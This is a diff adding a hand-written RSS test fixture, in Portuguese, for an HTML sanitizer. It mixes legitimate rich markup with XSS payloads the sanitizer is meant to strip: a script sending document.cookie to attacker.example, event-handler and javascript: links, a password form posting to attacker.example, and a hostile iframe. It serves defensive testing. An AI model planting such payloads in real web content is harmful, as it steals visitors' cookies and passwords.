@@ -1,0 +1,30 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- Hand-written: everything the sanitizer has to strip, plus the rich markup
+     it has to keep. No real feed volunteers this, so it is crafted. -->
+<rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>HTML malicioso</title>
+    <link>https://evil.example</link>
+    <description>Conteúdo hostil</description>
+    <item>
+      <guid>evil-1</guid>
+      <title>Script e handlers</title>
+      <link>https://evil.example/1</link>
+      <content:encoded><![CDATA[
+        <p>Texto legítimo com <strong>negrito</strong>, <em>itálico</em> e <a href="https://ok.example">link</a>.</p>
+        <script>fetch('https://attacker.example/steal?c=' + document.cookie)</script>
+        <img src="https://ok.example/foto.jpg" onerror="alert(1)" alt="foto">
+        <a href="javascript:alert(1)">clique</a>
+        <div onclick="alert(1)" style="position:fixed;top:0">bloco</div>
+        <form action="https://attacker.example"><input name="senha"><button>enviar</button></form>
+        <iframe src="https://attacker.example/frame"></iframe>
+        <iframe src="https://www.youtube.com/embed/abc123"></iframe>
+        <iframe src="https://player.vimeo.com/video/12345"></iframe>
+        <ul><li>lista</li></ul>
+        <pre><code>const x = 1</code></pre>
+        <table><tr><td>célula</td></tr></table>
+        <blockquote>citação</blockquote>
+      ]]></content:encoded>
+    </item>
+  </channel>
+</rss>
